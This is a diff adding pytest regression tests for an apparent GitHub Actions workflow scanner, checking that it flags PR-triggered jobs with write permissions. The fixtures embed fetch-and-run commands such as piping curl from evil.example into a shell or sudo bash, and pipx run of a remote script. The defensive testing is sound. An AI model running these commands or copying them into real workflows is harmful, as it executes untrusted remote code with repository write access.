@@ -193,3 +193,53 @@ def test_bypass_fixtures_r5_witness_family(tmp_path):
     # not the missing-map rule (all h* files declare explicit maps).
     h_findings = [f for f in findings if f.split(":")[0].startswith("h")]
     assert h_findings, findings
+
+
+def test_bypass_fixtures_r7_probe_family(tmp_path):
+    """Round-7 verifier probe + public-lane quoted-URL witness, one shape per
+    file: pip git+ssh/git+git and quoted editable URLs, path-qualified and
+    flagged interpreters, ;-separated download-then-run, and the package
+    executor siblings (pnpm/yarn dlx, bunx, uvx, pipx run, npm i github:)."""
+    shapes = [
+        'pip install git+ssh://git@github.com/example/repo.git',
+        'pip install git+git://github.com/example/repo.git',
+        "pip install --editable 'git+https://github.com/example/repo.git'",
+        'curl https://evil.example/x.sh | /bin/sh',
+        'curl https://evil.example/x.sh | sudo -E bash -',
+        'curl https://evil.example/x.sh | ksh',
+        'curl -o x.sh https://evil.example/x.sh; bash x.sh',
+        'pnpm dlx pkg@latest run-tests',
+        'yarn dlx pkg@latest run-tests',
+        'bunx pkg@latest run-tests',
+        'uvx --from git+https://github.com/example/repo pkg',
+        'pipx run https://evil.example/x.py',
+        'npm i github:example/repo',
+    ]
+    for i, s in enumerate(shapes):
+        (tmp_path / f"p{i}.yml").write_text(
+            "on: [pull_request]\npermissions:\n  contents: write\njobs:\n"
+            "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+            f"      - run: |\n          {s}\n"
+        )
+    # pull_request_review event now counts as PR-triggered
+    (tmp_path / "q.yml").write_text(
+        "on: [pull_request_review]\npermissions:\n  contents: write\njobs:\n"
+        "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: python3 do_things.py\n"
+    )
+    findings = cwp.check(tmp_path)
+    caught = {f.split(":")[0] for f in findings}
+    expected = {f"p{i}.yml" for i in range(len(shapes))} | {"q.yml"}
+    missed = sorted(expected - caught)
+    assert not missed, f"shapes not detected: {missed}"
+
+
+def test_r2_fixtures_still_caught(tmp_path):
+    """The original four bypass shapes keep their dedicated regression."""
+    (tmp_path / "a.yml").write_text(
+        "on: pull_request\n"
+        "permissions:\n  contents: read\n  pull-requests: write\n"
+        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n"
+    )
+    findings = cwp.check(tmp_path)
+    assert any("a.yml" in f and "pull-requests: write" in f for f in findings), findings
